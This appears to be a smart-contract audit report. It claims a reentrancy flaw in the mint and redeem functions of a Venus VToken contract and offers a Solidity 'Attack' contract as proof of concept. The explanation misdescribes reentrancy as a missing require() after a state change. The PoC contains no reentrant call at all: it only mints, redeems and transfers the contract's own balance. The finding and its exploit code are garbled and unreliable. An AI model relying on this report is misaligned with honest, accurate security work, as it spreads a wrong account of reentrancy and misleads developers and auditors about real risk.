# Vulnerability details

## Impact
The mint and redeem functions in VToken.sol are vulnerable to reentrancy attacks. This is because the functions do not call require() after they have made a state change. This means that an attacker could call the functions in a way that allows them to reenter the function and make additional state changes before the function has a chance to revert.

An attacker could exploit this vulnerability to drain the underlying assets from the VToken contract. This could lead to financial losses for the protocol and its users.


## Proof of Concept
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@venusprotocol/protocol/contracts/VToken.sol";

contract Attack {

  VToken public vtoken;
  ERC20 public underlying;

  constructor(address _vtoken, address _underlying) {
    vtoken = VToken(_vtoken);
    underlying = ERC20(_underlying);
  }

  function exploit() public {
    // Mint a large amount of tokens
    vtoken.mint(msg.sender, 1e18);

    // Redeem the tokens
    vtoken.redeem(msg.sender);

    // Drain the underlying assets
    underlying.transfer(msg.sender, underlying.balanceOf(address(this)));
  }
}


